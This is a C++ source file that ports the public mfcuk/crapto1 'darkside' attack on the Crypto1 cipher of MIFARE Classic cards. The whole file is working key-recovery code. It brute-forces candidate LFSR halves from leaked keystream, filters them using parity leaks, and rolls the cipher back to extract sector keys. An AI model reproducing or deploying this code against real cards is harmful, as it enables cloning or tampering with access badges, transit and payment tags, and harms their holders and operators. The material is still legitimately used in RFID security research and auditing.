// SPDX-License-Identifier: GPL-3.0-only
// Port of the public mfcuk/crapto1 darkside common-prefix attack, 2026-10-26.
#include "mfc_darkside.h"

#include "crypto1.h"

#include <stdlib.h>

namespace {

constexpr int kCandidateCapacity = 4096;
constexpr uint32_t kPrefixMask = (1u << 21) - 1u;

// crapto1 fast-forward constants for the odd and even LFSR halves.
const uint32_t kFastFwd[2][8] = {
    {0, 0x4BC53, 0x0ECB1, 0x450E2, 0x25E29, 0x6E27A, 0x2B298, 0x60ECB},
    {0, 0x1D962, 0x4BC53, 0x56531, 0x0ECB1, 0x135D3, 0x450E2, 0x58980},
};

uint8_t bit(uint32_t v, int n) { return (uint8_t)((v >> n) & 1u); }

bool checkPfxParity(uint32_t prefix, uint32_t rresp, const uint8_t parities[8][8],
                    uint32_t odd, uint32_t even, Crypto1State *out) {
    Crypto1State s;
    for (uint32_t c = 0; c < 8; c++) {
        s.odd = odd ^ kFastFwd[1][c];
        s.even = even ^ kFastFwd[0][c];

        crypto1_rollback_bit(&s, 0, 0);
        crypto1_rollback_bit(&s, 0, 0);
        const uint32_t ks3 = crypto1_rollback_bit(&s, 0, 0);
        const uint32_t ks2 = crypto1_rollback_word(&s, 0, 0);
        const uint32_t ks1 = crypto1_rollback_word(&s, prefix | (c << 5), 1);

        const uint32_t nr = ks1 ^ (prefix | (c << 5));
        const uint32_t rr = ks2 ^ rresp;

        if (!(crypto1_parity32(nr & 0x000000ffu) ^ parities[c][3] ^ bit(ks2, 24))) return false;
        if (!(crypto1_parity32(rr & 0xff000000u) ^ parities[c][4] ^ bit(ks2, 16))) return false;
        if (!(crypto1_parity32(rr & 0x00ff0000u) ^ parities[c][5] ^ bit(ks2, 8))) return false;
        if (!(crypto1_parity32(rr & 0x0000ff00u) ^ parities[c][6] ^ bit(ks2, 0))) return false;
        if (!(crypto1_parity32(rr & 0x000000ffu) ^ parities[c][7] ^ (ks3 & 1u))) return false;
    }
    *out = s;
    return true;
}

} // namespace

namespace mfc_darkside {

int prefixCandidates(const uint8_t ks[8], int isOdd, uint32_t *out, int capacity) {
    if (!ks || !out || capacity <= 0 || (isOdd != 0 && isOdd != 1)) return -1;

    int n = 0;
    for (uint32_t cand = 0; cand <= kPrefixMask; cand++) {
        bool ok = true;
        for (int c = 0; c < 8; c++) {
            const uint32_t entry = cand ^ kFastFwd[isOdd][c];
            if (crypto1_filter_u32(entry >> 1) != bit(ks[c], isOdd) ||
                crypto1_filter_u32(entry) != bit(ks[c], isOdd + 2)) {
                ok = false;
                break;
            }
        }
        if (!ok) continue;
        if (n >= capacity) return -1;
        out[n++] = cand;
    }
    return n;
}

int recoverKeys(uint32_t prefix, uint32_t arEnc, const uint8_t ks[8],
                const uint8_t par[8][8], uint32_t uid, uint32_t nt,
                uint64_t *keys, int maxKeys) {
    if (!ks || !par || !keys || maxKeys <= 0) return -1;

    uint32_t *odd = (uint32_t *)malloc(sizeof(uint32_t) * kCandidateCapacity);
    uint32_t *even = (uint32_t *)malloc(sizeof(uint32_t) * kCandidateCapacity);
    if (!odd || !even) {
        free(odd);
        free(even);
        return -1;
    }
    const int nOdd = prefixCandidates(ks, 1, odd, kCandidateCapacity);
    const int nEven = prefixCandidates(ks, 0, even, kCandidateCapacity);
    if (nOdd < 0 || nEven < 0) {
        free(odd);
        free(even);
        return -1;
    }

    int found = 0;
    for (int oi = 0; oi < nOdd; oi++) {
        for (int ei = 0; ei < nEven; ei++) {
            for (uint32_t top = 0; top < 64; top++) {
                odd[oi] += 1u << 21;
                even[ei] += (!(top & 7u) + 1u) << 21;

                Crypto1State state;
                if (!checkPfxParity(prefix, arEnc, par, odd[oi], even[ei], &state)) continue;

                crypto1_rollback_word(&state, uid ^ nt, 0);
                uint64_t key = 0;
                crypto1_get_lfsr(&state, &key);

                bool duplicate = false;
                for (int i = 0; i < found; i++) {
                    if (keys[i] == key) {
                        duplicate = true;
                        break;
                    }
                }
                if (duplicate) continue;

                keys[found++] = key;
                if (found >= maxKeys) {
                    free(odd);
                    free(even);
                    return found;
                }
            }
        }
    }
    free(odd);
    free(even);
    return found;
}

} // namespace mfc_darkside
